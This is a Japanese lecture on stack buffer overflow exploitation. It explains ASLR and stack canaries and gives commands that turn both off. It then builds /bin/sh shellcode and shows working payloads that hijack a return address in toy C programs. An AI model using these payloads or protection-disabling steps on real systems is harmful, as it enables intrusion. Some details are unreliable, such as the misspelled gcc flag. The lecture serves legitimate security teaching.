# Lecture 2: スタックオーバーフロー

[Lecture 1 の資料](/Lecture1/README.md)を読み終えていることを前提にします。その資料では、主にメモリの考え方とスタックの伸び方を説明しました。この講義に進む前に、まずそちらを読んでください。

この講義では、次の内容を扱う予定です。
* スタックオーバーフロー。
* その防御機構。
    * ASLR。
    * Stack canary。
* シェルコードとは何か。
* スタックオーバーフローを exploit して、プログラムの制御の流れを変える。


始めましょう。

### スタックオーバーフロー
C のように、高水準言語の命令が典型的な機械語にそのまま対応する言語には、スタック上に宣言したバッファ(char 配列)が、受け取るべき量より多い入力を受け取ってしまうかどうかを見つける仕組みがありません。そうした検査をしないのは、機械語並みの速度を得るためでした。

Lecture 1 のスタックの図を覚えていれば、関数呼び出し時のスタックは次のようになっています。
```
                       +   Previous function  +
                       |     Stack frame      +
                       |                      |
                       +----------------------+ <--+ previous function stack frame end here
                       |Space for return value|
                       +----------------------+
                       |Arguments for function|
                       +----------------------+
                       |    return address    |
                       +----------------------+
                       |     saved $ebp       |
                       +----------------------+
                       |                      | <--+  padding done by compilers
                       +------------+---------+
                       |         |4 |         |
                       |         |3 |         |
                       |         |2 | ^       |
                       |         |1 | |       |
                       |      ch |0 | |       |
                       +------------+-+-------+
                       |                      |
                       |     unused space     |
                       +                      +
```

バッファがスタック上でどう並んでいるかを見てください。バッファ(char 配列)は、低いメモリアドレスから高いアドレスへ向かって格納されます。また、C のプログラムは、配列のサイズが入力のサイズより小さくないかを検査しません。
そこで、次のことを覚えておきましょう。
* C はバッファオーバーフローを検査しない。
* バッファは低いメモリアドレスから高いアドレスへ向かって格納される。
* バッファの直後には、ある量だけあふれさせると、保存された
* `$ebp` と戻りアドレスを書き換えられる。
* 戻りアドレスを変えられれば、制御の流れを変えられる。:cool:

### スタックの保護
#### 1. ASLR
> Address space layout randomization (ASLR) is a computer security technique
> involved in preventing exploitation of memory corruption vulnerabilities. In
> order to prevent an attacker from reliably jumping to, for example, a
> particular exploited function in memory, ASLR randomly arranges the address
> space positions of key data areas of a process, including the base of the
> executable and the positions of the stack, heap and libraries. 参照: [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization)

要するに ASLR は、ヒープでもスタックでも、実行のたびに各セクションの開始アドレスを変え続けます。そのため、ASLR は exploit の妨げになります。どうすればよいでしょうか。無効にします。:smile:
ASLR が有効なシステムでスタックを exploit する方法は、今後の講義で扱います。
今のところは、次のコマンドで無効にできます。
`echo "0" | sudo dd of=/proc/sys/kernel/randomize_va_space`

#### 2. Stack Canary
>Stack canaries, named for their analogy to a canary in a coal mine, are used to
>detect a stack buffer overflow before execution of malicious code can occur.
>This method works by placing a small integer, the value of which is randomly
>chosen at program start, in memory just before the stack return pointer. 参照: (link)[https://en.wikipedia.org/wiki/Stack\_buffer\_overflow#Stack\_canaries]

つまり、これはバッファを守るだけのものです。コンパイラが実装している手法で、プログラム中のバッファの末尾の後ろにランダムなデータを入れておき、システムがバッファオーバーフローを見つけられるようにします。
今のところは、次のコンパイラオプションでこの機能を無効にします。
`gcc -fno-stackprotector <file>.c`

### シェルコード
シェルコード(Shell code)は、脆弱なバイナリに注入するために使う、バイナリ形式の小さなペイロードです。ペイロードは何のためにでも作れます。単なるモジュール単位のバイナリコードです。
シェルコードの作成はそれだけで大きなテーマなので、ここでは簡単に扱います。シェルを起動するシェルコードを作ります。まず、次の内容で shellcode.nasm を作ってください。
[詳しくはこちら](http://www.vividmachines.com/shellcode/shellcode.html)

```
xor     eax, eax    ;Clearing eax register
push    eax         ;Pushing NULL bytes
push    0x68732f2f  ;Pushing //sh
push    0x6e69622f  ;Pushing /bin
mov     ebx, esp    ;ebx now has address of /bin//sh
push    eax         ;Pushing NULL byte
mov     edx, esp    ;edx now has address of NULL byte
push    ebx         ;Pushing address of /bin//sh
mov     ecx, esp    ;ecx now has address of address
                    ;of /bin//sh byte
mov     al, 11      ;syscall number of execve is 11
int     0x80        ;Make the system call
```

`nasm` でコンパイルします。
`nasm -f elf shellcode.asm`

次に、シェルコードのバイト列を取り出したくなるでしょう。それは何かというと、これらの命令に対応する機械語です。
どうやって取り出すのでしょうか。`objdump` が役に立ちます。
`objdump -d shellcode.o`
次のような出力が得られます。
```
shellcode.o:     file format elf32-i386
Disassembly of section .text:

00000000 <.text>:
   0:    31 c0                    xor    %eax,%eax
   2:    50                       push   %eax
   3:    68 2f 2f 73 68           push   $0x68732f2f
   8:    68 2f 62 69 6e           push   $0x6e69622f
   d:    89 e3                    mov    %esp,%ebx
   f:    50                       push   %eax
  10:    89 e2                    mov    %esp,%edx
  12:    53                       push   %ebx
  13:    89 e1                    mov    %esp,%ecx
  15:    b0 0b                    mov    $0xb,%al
  17:    cd 80                    int    $0x80
```
次のシェルスクリプトで、それを抽出できます。:cool:
``for i in `objdump -d shellcode.o | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}$' ` ; do echo -n "\x$i" ; done``

実際のプログラムを exploit する:
---

#### 1. 次のコードを考えます
```c
#include <stdio.h>

void bar()
{
    printf("How come you entered into bar ?\n");
}

void foo()
{
    char buffer[10];
    scanf("%s", buffer);
    printf("Hello ji %s \n", buffer);
}

int main()
{
    foo();
    return 0;
}
```
課題は、制御の流れを変えて `bar` 関数を呼び出させることです。
始めましょう。コンパイルの手順はファイルの中にあります。
バッファの位置と、そこから $ebp までの距離を特定します。
`objdump -d ./first`
```
0804848b <bar>:
 804848b:    55                       push   %ebp
 804848c:    89 e5                    mov    %esp,%ebp
 ...

080484a4 <foo>:
 80484a4:    55                       push   %ebp
 80484a5:    89 e5                    mov    %esp,%ebp
 80484a7:    83 ec 18                 sub    $0x18,%esp
 80484aa:    83 ec 08                 sub    $0x8,%esp
 80484ad:    8d 45 ee                 lea    -0x12(%ebp),%eax
 80484b0:    50                       push   %eax
 80484b1:    68 a0 85 04 08           push   $0x80485a0
 80484b6:    e8 b5 fe ff ff           call   8048370 <__isoc99_scanf@plt>
 80484bb:    83 c4 10                 add    $0x10,%esp
 80484be:    83 ec 08                 sub    $0x8,%esp
 80484c1:    8d 45 ee                 lea    -0x12(%ebp),%eax
 80484c4:    50                       push   %eax
 80484c5:    68 a3 85 04 08           push   $0x80485a3
 80484ca:    e8 71 fe ff ff           call   8048340 <printf@plt>
 80484cf:    83 c4 10                 add    $0x10,%esp
 80484d2:    90                       nop
 80484d3:    c9                       leave
 80484d4:    c3                       ret

080484d5 <main>:
...
 80484df:    55                       push   %ebp
 80484e0:    89 e5                    mov    %esp,%ebp
 80484e2:    51                       push   %ecx
 80484e3:    83 ec 04                 sub    $0x4,%esp
 80484e6:    e8 b9 ff ff ff           call   80484a4 <foo>
...

```

`foo` の次の命令に注目してください
```
 80484ad:    8d 45 ee                 lea    -0x12(%ebp),%eax
 80484b0:    50                       push   %eax
 80484b1:    68 a0 85 04 08           push   $0x80485a0
 80484b6:    e8 b5 fe ff ff           call   8048370 <__isoc99_scanf@plt>
```

`$ebp` から 0x12 を引いた値が、`scanf` の呼び出しのためにスタックへ push されています。
そのうちの1つは、scanf が入力を書き込むバッファにほかなりません。
これが、注入の対象となるバッファのはずです。base16(12) == base10(18) なので、バッファは `$ebp` から18バイトの位置にあります。

これでようやく、ペイロードを作る準備ができました。
``echo -e `python -c 'print "A"*18+<Dummay valur for EBP>+<Return address>'` | ./first ``
実際のペイロードは次のようになります。
``echo -e `python -c 'import struct;print "A"*18+"BBBB"+struct.pack("<I", 0x0804848b )'` | ./first ``

```
Hello ji AAAAAAAAAAAAAAAAAABBBB?
How come you entered into bar ?
Segmentation fault (core dumped)
```

:smile: バッファオーバーフローを exploit できました。

#### exploit\_me\_2.c `Shellcode injection` を解いてみましょう :smile:
* ASLR を無効にします。
* GDB を使って、バッファの開始アドレスを調べます。
* 戻りアドレスがバッファの開始アドレスになるように、スタックをあふれさせます。
* バッファにはシェルコードを入れておきます。
exploit は次のようになるでしょう。
```bash
./second `python -c 'import struct;shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"; bufferlen=108; print shellcode+"\x90"*(bufferlen-len(shellcode))+"BBBB"+struct.pack("<I", starting address of the buffer)'`
```

